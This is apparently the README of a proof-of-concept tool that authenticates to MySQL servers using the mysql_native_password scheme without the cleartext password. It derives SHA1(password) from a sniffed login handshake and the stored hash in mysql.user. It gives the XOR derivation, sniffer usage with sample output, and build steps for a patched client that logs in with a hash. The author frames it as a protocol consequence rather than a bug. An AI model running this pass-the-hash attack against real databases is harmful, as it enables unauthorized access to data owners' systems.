mysql-unsha1
============

Authenticate against a MySQL server without knowing the cleartext password.

Abstract
--------

This PoC shows how it is possible to authenticate against a MySQL server under
certain circumstances without knowing the cleartext password when the [Secure
Password Authentication] authentication plugin (aka `mysql_native_password`) is
used.

Preconditions are:

- to obtain a read-only access to the `mysql.user` table in the target database
  in order to fetch the hashed password for a given user;

- to be able to sniff a successful authentication handshake performed by the
  aforementioned user (i.e., [authentication via SSL] would nullify this
  attempt).

**Note:** This is not a bug nor a vulnerability in MySQL (this is hardly an
*exploit* actually), it is just a direct consequence of how the authentication
protocol works. If an attacker is able to satisfy the above points then the
whole system is probably already compromised. Yet this exploit may offer an
alternative approach to obtain a proper authenticated access to a MySQL server.

MySQL server passwords
----------------------

By default, passwords are stored in the `mysql.user` table and are hashed using
the `PASSWORD` function which is just a two-stage SHA1 digest:

```
mysql> SELECT DISTINCT password FROM mysql.user WHERE user = "root";
*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19

mysql> SELECT PASSWORD('password');
*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19

mysql> SELECT SHA1(UNHEX(SHA1('password')));
2470c0c06dee42fd1618bb99005adca2ec9d1e19
```

The handshake
-------------

After the TCP connection phase, initiated by the client, the MySQL
authentication [handshake] continues as follows (simplified):

1. the server sends a `Server Greeting` packet containing a *salt* (`s`);

2. the client replies with a `Login Request` packet containing the session
   password (`x`), computed as follows:

        x := SHA1(password) XOR SHA1(s + SHA1(SHA1(password)))

    where `password` is the cleartext password as provided by the user and `+`
    is a mere string concatenation operator;

3. the server can verify the *challenge* and authenticate the client if:

        SHA1(x XOR SHA1(s + SHA1(SHA1(password)))) = SHA1(SHA1(password))

The exploit
-----------

With enough information an attacker is able to obtain `SHA1(password)` and
therefore to solve the server challenge without the knowledge of the cleartext
password.

Let:

- `h` be the hashed password obtained from the `mysql.user` table (i.e.,
  `SHA1(SHA1(password))`);

- `s` and `x` be the salt and the session password respectively obtained from
   the sniffed handshake.

The first-stage SHA1 can be obtained as follows:

    SHA1(password) = x XOR SHA1(s + h)

Tools
-----

To ease the reproducibility of the exploit, this PoC provides two tools:

- a simple sniffer to extract and check the handshake information either live or
  offline from a PCAP file;

- a patch for MySQL client which allows to treat the prompted passwords as SHA1
  digests instead of cleartexts.

### The sniffer

To build `mysql-unsha1-sniff` just run `make` (or `make static` to produce a
statically linked executable). The Makefile will look for the `uthash.h` file in
this directory and will download it if not found.

Run `mysql-unsha1-sniff` without arguments to display the usage message.

In accordance with the previous example:

    sudo ./mysql-unsha1-sniff -i lo 127.0.0.1 3306 2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19:root

Once a successful authentication handshake is captured the output will be like:

    [+] Input:
    [+] - username ........................ 'root'
    [+] - salt ............................ 3274756c42415d3429717e482a3776704d706b49
    [+] - client session password ......... 6d45a453b989ad0ff0c84daf623e9870f129c329
    [+] - SHA1(SHA1(password)) ............ 2470c0c06dee42fd1618bb99005adca2ec9d1e19
    [+] Output:
    [+] - SHA1(password) .................. 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
    [+] Check:
    [+] - computed SHA1(SHA1(password)) ... 2470c0c06dee42fd1618bb99005adca2ec9d1e19
    [+] - authentication status ........... OK

If no account information are provided, the tool will only display the salt and
the session password.

### The patched MySQL client

Building the MySQL client may take some time and requires a certain amount of
free disk space:

1. download and extract the MySQL source code:

        wget https://github.com/mysql/mysql-server/archive/mysql-5.7.17.tar.gz
        tar xf mysql-5.7.17.tar.gz
        cd mysql-server-mysql-5.7.17

2. apply the patch:

        patch -p1 </path/to/mysql-server-unsha1.patch

3. build (without server) with:

        mkdir build
        cd build
        cmake -DDOWNLOAD_BOOST=1 -DWITH_BOOST=boost -DWITHOUT_SERVER:BOOL=ON ..
        make -j$(nproc)

4. the client executable will be created at `client/mysql`, optionally install
   it globally and delete the whole source code to save some space:

        sudo cp client/mysql /usr/local/bin/mysql-unsha1
        cd ../..
        rm -fr mysql-server-mysql-5.7.17

Use `mysql-unsha1` as the original MySQL client, just remember that the
`--password[=password], -p[password]` option now requires a 40-digit hexadecimal
SHA1 string.

In accordance with the previous example:

    mysql-unsha1 -h 127.0.0.1 -P 3306 -u root --password=5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8

Where:

```
mysql> SELECT SHA1(UNHEX('5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8'));
2470c0c06dee42fd1618bb99005adca2ec9d1e19
```

and `2470c0c06dee42fd1618bb99005adca2ec9d1e19` is the hashed password stored in
the `mysql.user` table.

[Secure Password Authentication]: https://dev.mysql.com/doc/internals/en/secure-password-authentication.html
[authentication via SSL]: https://dev.mysql.com/doc/internals/en/ssl.html
[handshake]: https://dev.mysql.com/doc/internals/en/plain-handshake.html
